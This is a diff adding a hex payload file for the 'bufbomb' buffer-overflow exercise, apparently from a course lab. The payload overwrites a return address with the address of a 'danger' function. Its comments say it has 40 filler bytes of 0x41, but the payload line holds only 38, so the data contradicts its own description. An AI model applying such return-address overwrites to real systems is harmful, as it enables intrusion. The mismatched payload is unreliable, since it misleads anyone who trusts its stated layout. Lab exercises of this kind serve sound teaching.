@@ -1,0 +1,5 @@
+# Payload for bufbomb level: 40 filler bytes (0x41 'A') then 8-byte little-endian address of danger (0x0000000000401206)
+# Hex bytes (space-separated):
+# 41 repeated 40 times, then 06 12 40 00 00 00 00 00
+
+41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 06 12 40 00 00 00 00 00
